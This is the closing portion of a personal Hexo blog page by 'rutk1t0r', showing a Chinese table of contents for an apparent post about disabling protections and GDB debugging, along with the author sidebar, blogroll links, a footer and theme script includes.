href="#%E9%9C%80%E8%A6%81%E5%85%B3%E9%97%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E9%80%89%E9%A1%B9"><span class="nav-number">3.2.</span> <span class="nav-text">需要关闭的保护选项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AFGDB%E8%B0%83%E8%AF%95"><span class="nav-number">3.3.</span> <span class="nav-text">开启GDB调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%91%A2"><span class="nav-number">4.</span> <span class="nav-text">直接运行呢?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rutk1t0r"
      src="/embpgp.github.io/images/avatar.png">
  <p class="site-author-name" itemprop="name">rutk1t0r</p>
  <div class="site-description" itemprop="description">gnireenigne 0x41414141 \xff\xe4\xcc</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/embpgp.github.io/archives/">
        
          <span class="site-state-item-count">40</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/embpgp.github.io/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/embpgp.github.io/tags/">
          
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/embpgp" title="Github → https:&#x2F;&#x2F;github.com&#x2F;embpgp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/rutk1t0r" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;rutk1t0r" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://www.hicoder.cn/" title="http:&#x2F;&#x2F;www.hicoder.cn" rel="noopener" target="_blank">Yuan</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.cnblogs.com/fangyz" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;fangyz" rel="noopener" target="_blank">Fangyz</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://watch0.top/" title="http:&#x2F;&#x2F;watch0.top" rel="noopener" target="_blank">w@tch0</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rutk1t0r</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">152k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">2:18</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/embpgp.github.io/lib/anime.min.js"></script>
  <script src="/embpgp.github.io/lib/velocity/velocity.min.js"></script>
  <script src="/embpgp.github.io/lib/velocity/velocity.ui.min.js"></script>

<script src="/embpgp.github.io/js/utils.js"></script>

<script src="/embpgp.github.io/js/motion.js"></script>


<script src="/embpgp.github.io/js/schemes/pisces.js"></script>


<script src="/embpgp.github.io/js/next-boot.js"></script>




  




  
<script src="/embpgp.github.io/js/local-search.js"></script>













  

  

</body>
</html>
